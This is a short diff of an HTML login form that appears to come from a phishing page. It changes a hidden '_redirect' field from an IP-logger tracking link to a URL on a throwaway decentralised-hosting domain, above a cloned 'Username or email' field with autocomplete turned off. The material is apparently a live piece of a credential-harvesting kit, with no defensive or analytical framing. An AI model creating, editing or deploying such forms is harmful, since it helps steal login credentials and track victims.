@@ -35,7 +35,7 @@
 <input
     type="hidden"
     name="_redirect"
-    value="https://iplogger.com/2L3Pi5"
+    value="https://proud-mountain-4220.on.fleek.co/Code"
   />
 <div class="input-group" style="box-sizing: inherit; line-height: 1.75; position: relative; max-width: 42em; margin-top: 1.0625rem;"><label class="override" for="userId" style="box-sizing: inherit; line-height: 1.75; display: block; font-size: 1rem; margin-bottom: 0.4em; position: relative; margin-top: 1.2em; max-width: 42em; font-weight: 600 !important;">Username or email</label><input aria-required="true" autocomplete="off" data-username="data-username" id="userId" name="username" style="box-sizing: inherit; line-height: unset; color: rgb(16, 16, 18); font-style: inherit; font-variant: inherit; font-weight: 400; font-stretch: inherit; font-size: 16px; font-family: inherit; margin: 6px 0px 0px; width: 510px; border-width: 0.0625rem; border-style: solid; border-color: rgb(0, 0, 0); border-radius: 0.125rem; background-color: rgb(255, 255, 255); padding: 0.7em; display: block; overflow: visible; max-width: none; height: 3rem;" type="text" value="" /></div>
 
